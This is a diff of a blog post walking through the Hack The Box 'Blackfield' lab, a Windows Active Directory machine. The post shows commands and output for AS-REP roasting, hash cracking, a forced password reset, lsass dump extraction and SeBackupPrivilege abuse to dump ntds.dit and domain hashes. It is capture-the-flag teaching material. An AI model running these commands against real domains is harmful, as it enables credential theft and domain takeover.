@@ -1,16 +1,37 @@
 ---
-title: Hackthebox - Blackfield
-description: this is my first blog using vuepress
+layout: single
+title: Blackfield - Hack The Box
+excerpt: "Backfield is a hard difficulty Windows machine featuring Windows and Active Directory misconfigurations. Anonymous / Guest access to an SMB share is used to enumerate users. 
+Once user is found to have Kerberos pre-authentication disabled, which allows an attacker to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext
+password. With this user we can access an SMB share containing forensics artefacts, including an lsass process dump. This contains a username and a password for a user with WinRM privileges, 
+who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator."
+date:  2022-04-21
+header:
+  teaser: /assets/img/blackfield/cover-blackfield.png
+  teaser_home_page: true
+  icon: /assets/htb.png
+categories:
+  - hackthebox
+  - infosec
 tag:
-    - Hard
+    - SeBackup
     - Active Directory
+    - Bloodhound
+    - ForceChangePassword
 ---
 
 ![](/assets/img/blackfield/cover-blackfield.png)
 
-### Portscan
+## Synopsis
 
-```bash
+Backfield is a hard difficulty Windows machine featuring Windows and Active Directory misconfigurations. Anonymous / Guest access to an SMB share is used to enumerate users. 
+Once user is found to have Kerberos pre-authentication disabled, which allows an attacker to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext
+password. With this user we can access an SMB share containing forensics artefacts, including an lsass process dump. This contains a username and a password for a user with WinRM privileges, 
+who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator.
+
+## Portscan
+
+```powershell
 PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-05 01:20:13Z)
@@ -35,15 +56,15 @@ Host script results:
 |_  start_date: N/A
 ```
 
-### Reconaissance
+## Reconaissance
 
-Doing ldap enumeration doesn't show me the way, so i keep move onto RPC.
-RPC sucessfull login with guest as user without password, but i cannot use command such as `enumdomusers`,`enumdomains`.
-unfortunetly when i used `smbclient` tools without -U and -N i able to see list share about this target with password empty.
+Doing ldap enumeration doesn't show me the way, so i keep move onto RPC service.
+Sucessfully login anonymously on RPC, but we cannot use command such as `enumdomusers`,`enumdomains`.
+anonymous login can also be done on the smbclient service
 
 ![](/assets/img/blackfield/1.png)
 
-in this case we cannot able to list forensic share but when we check the profiles$ share, we've got bunch of username list. This is great because with this list we can perfrom AS-REP Roasting, this technique include KERBEROASTING Methodology.
+in this case we cannot able to list forensic share, but when we check the `profiles$` share we will get bunch of usernames. This is great because with these names we can perfrom AS-REP Roasting, this technique include KERBEROASTING Methodology.
 
 
 > KERBEROASTING is stealling service account password and crack them offline with wordlist.
@@ -51,73 +72,74 @@ in this case we cannot able to list forensic share but when we check the profile
 
 ![](/assets/img/blackfield/2.png)
 
-After get those names, use script from impacket GetNPusers.py with following command :
+you can grab those names, and perform AS-REP Roasting using `GetNPusers.py` from impacket with prompt :
 
-`GetNPUsers.py BLACKFIELD.local/ -usersfile usernames.txt -format hashcat -dc-ip 10.10.10.192 -outputfile AS-REP`
+```powershell
+GetNPUsers.py BLACKFIELD.local/ -usersfile usernames.txt -format hashcat -dc-ip 10.10.10.192 -outputfile AS-REP
+```
 
-```bash
+Result from AS-REP
+
+```powershell
 ┌─[root@unknown101]─[10.10.14.14]─[~/Desktop/hackthebox/ActiveDirectory/Blackfield]
 └──╼ #cat AS-REP 
 $krb5asrep$23$support@BLACKFIELD.LOCAL:17bc70e610b036b35661ef81b9d57219$13aceded8bab3f6f2c6dd3252f562fb896a2940519ca82e31467833a818521d68d85169e37aa9e772c483454199a9d8cf588585b65522a85a294283b8288cc74ab0c9406bf60cb30174dd9ff95c78c72e02bcea4f047d0f0a59ccbc5ffbd314b8f26f63dd2ce409517d4e4489dc5b66203222eef34a70c00c49e30bdd3af2520c854d0dbbdf1ade21cdb9bd8e566c06d16d8e374b8004f76ec46f9e08700afd8ab4fc2c27231bdb79778f7468eb0cc089d5a0aa7dfabaa63fe2dd77d63154d73344e5e003a816e2cc6435082b25be46740356205a44940876089ffcf81f1ff5b9ac2d1e3cb474a1d9d99a8f8a99a7f0aff805300
 ```
 
-as you can see we able to steal support account from target, now crack this NTLM with hashcat using module 18200.
+We can use `hashcat` for crack the HASH using module 18200.
 
 `hashcat -m 18200 -a 0 AS-REP ~/Desktop/htb-tool/rockyou.txt`
 
 ![](/assets/img/blackfield/3.png)
 
-notif from hashcat successfully crack the hash with status cracked, now im gonna going to forensic share using this creds.
+notif from hashcat successfully crack the hash with status cracked, now im gonna going to `forensic$` share using this creds.
 
 `support:#00^BlackKnight`
 
 ![](/assets/img/blackfield/4.png)
 
-we still dont have an access for this share, im gonna use [Bloodhound.py](https://github.com/fox-it/BloodHound.py) this script for AD environtment so we can gather information from target with this script.
+we still dont have any access to this share, for further i will use [Bloodhound.py](https://github.com/fox-it/BloodHound.py) to collect information regarding targets.
 
 `./bloodhound.py -d BLACKFIELD.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c all`
 
 ![](/assets/img/blackfield/5.png)
 
-after that turn on the bloodhound and neo4j , because we need to find what power support as user inside target. 
+in this below result from bloodhound
 
 ![](/assets/img/blackfield/6.png)
 
-Binggo!! we found what we need in this time, user support can change password for audit2020. RPC has change password fitur, we can take advantages of this service, im gonna change password `audit2020` to `Password123` because when i set this password needed integer.
+We found what we need in this time, user support can change password for audit2020. RPC service has change password feature, we can take advantages of this service, change password for `audit2020` user into `Password123`.
 
 ![](/assets/img/blackfield/7.png)
 
-After change the password i move into smb share again for check if audit2020 has permission into their share or not.
+After change the password i move into smb share again to check if audit2020 has permission into their share or not.
 
 ![](/assets/img/blackfield/8.png)
 
-So far so good tho!! so i tried to looking what inside this shares until i found lsass.zip.
-what is LSASS ?
+at the time of enumeration i found the lsass.zip; in short Local Security Authority Subsytem Service (LSASS) is a process in Microsoft Windows operating system that is responsible for enforcing the security policy. It verifies users logging on to a windows computer or server, handles password changes, and creates access tokens.
 
-:::tip
-Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens
-:::
-
-use this command below if you get trouble when download this zip file.
-
-`smbget -R smb://audit2020:'Password123'@10.10.10.192/forensic/memory_analysis/lsass.zip`
-
-after unzip this lsass.zip i found file lsass.dmp, actually we can dump this file using [pypykatz](https://github.com/skelsec/pypykatz). 
+Download the zip file into our host with prompt:
 
 ```bash
+smbget -R smb://audit2020:'Password123'@10.10.10.192/forensic/memory_analysis/lsass.zip
+```
+
+after unzip this lsass.zip we will find file lsass.dmp, actually we can dump this file using [pypykatz](https://github.com/skelsec/pypykatz) tools. 
+
+```powershell
 ┌─[root@unknown101]─[10.10.14.14]─[~/Desktop/hackthebox/ActiveDirectory/Blackfield]
 └──╼ #ls | grep lsass.
 lsass.DMP
 lsass.zip
 ```
 
-for dumping all this information exec command below :
+Exec command below for extracting DMP file :
 
 `pypykatz lsa  minidump lsass.DMP -o dump.txt`
 
-i've got so much information contains NTLM hash, but luckily i found hash for svc_backup then use evilwin-rm to login with hash as svc_backup. Beside i found administrator NTLM hash too but i think it's not gonna work.
+retrieve an information contains NTLM hash for svc_backup user, use the following hash to login using evil-winrm. 
 
-```bash
+```powershell
 ┌─[root@unknown101]─[10.10.14.14]─[~/Desktop/hackthebox/ActiveDirectory/Blackfield]                                                                           
 └──╼ #cat dump.txt
 [..] 
@@ -133,11 +155,11 @@ Username: svc_backup
 
 ![](/assets/img/blackfield/9.png)
 
-### Privilege Escalation
+## Privilege Escalation
 
-in privilege information sections i found `SeBackupPrivilege` and `SeRestorePrivilege`, this privilege is highly vulnerable because we can backup anything from server such as `NDTS.dit`,`Security Account Manager(SAM)`.
+in privilege information sections i found `SeBackupPrivilege` and `SeRestorePrivilege` enabled, this privilege is highly vulnerable because we can backup anything from server such as `NDTS.dit`,`Security Account Manager(SAM)`.
 
-```bash
+```powershell
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -150,18 +172,16 @@ SeRestorePrivilege            Restore files and directories  Enabled
 
 ```
 
-:::danger
-SeBackupPrivilege privilege, the user can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.  
+>SeBackupPrivilege privilege, the user can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.  
 This privilege causes the system to grant all read access control to any file, regardless of the [_access control list_](https://docs.microsoft.com/en-us/windows/win32/secgloss/a-gly#_security_access_control_list_gly) (ACL) specified for the file. Any access request other than read is still evaluated with the ACL. The following access rights are granted if this privilege is held:  
 READ\_CONTROL  
 ACCESS\_SYSTEM\_SECURITY  
 FILE\_GENERIC\_READ  
 FILE\_TRAVERSE
-:::
 
-Now we can start the explotation of this privilege, firtsly add script below and given name script.txt, we can take advantages of diskshadow binary.
+and now we define the steps to gain access as administrator, firtsly add script below and given name script.txt, and then we can take advantages of `diskshadow` binary.
 
-```text
+```powershell
 set context persistent nowriters  
 set metadata c:\windows\system32\spool\drivers\color\example.cab  
 set verbose on  
@@ -174,31 +194,30 @@ expose %mydrive% w:
 end backup  
 ```
 
-run `diskshadow /s script.txt` command will execute the script.txt, then you can clone [this repo](https://github.com/giuliano108/SeBackupPrivilege) and upload into target.
+execute `diskshadow /s script.txt` command will start backup from C drive into Z drive, after that you need to clone [this repo](https://github.com/giuliano108/SeBackupPrivilege) and upload .dll files into target.
 
-```bash
+```powershell
 #evil-winrm
 upload SeBackupPrivilegeUtils.dll
 upload SeBackupPrivilegeCmdLets.dll
 
-# import module cmdlets
-
+# import module cmdlets command
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 Import-Module .\SeBackupPrivilegeUtils.dll
 ```
 
-here's the fun part!! we're gonna backup NTDS.dit from W drive that we create early to `C:\temp`. After that you can download `ntds.dit` and `system` into host. 
+after the backup process is complete we need to copy ntds.dit from Z drive into C:\temp\, and download `ntds.dit` and `system` into our host with following command: 
 
-```bash
+```powershell
 Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\temp\ntds.dit -Overwrite
 reg save HKLM\SYSTEM c:\temp\system
 ```
 
-last but not least use secretdumps.py to extract all information with following command :
+last but not least use `secretdumps.py` from impacket to extract all information from ntds.dit with prompt :
 
 `secretsdump.py -ntds ntds.dit -system system -just-dc LOCAL`
 
-```bash{9}
+```powershell
 ┌─[root@unknown101]─[10.10.14.14]─[~/Desktop/hackthebox/ActiveDirectory/Blackfield]                                                                                                                                                        
 └──╼ #secretsdump.py -ntds ntds.dit -system system -just-dc LOCAL                 
 Impacket v0.9.23.dev1+20210421.100825.fea485d2 - Copyright 2020 SecureAuth Corporation 
@@ -217,7 +236,7 @@ BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c
 BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
 ```
 
-like a charm!!! now we can use NTLM hash using evil-winrm as Administrator.... then collect root.txt
+like a charm!!! now we can use NTLM hash using evil-winrm as Administrator
 
 ![](/assets/img/blackfield/10.png)
 
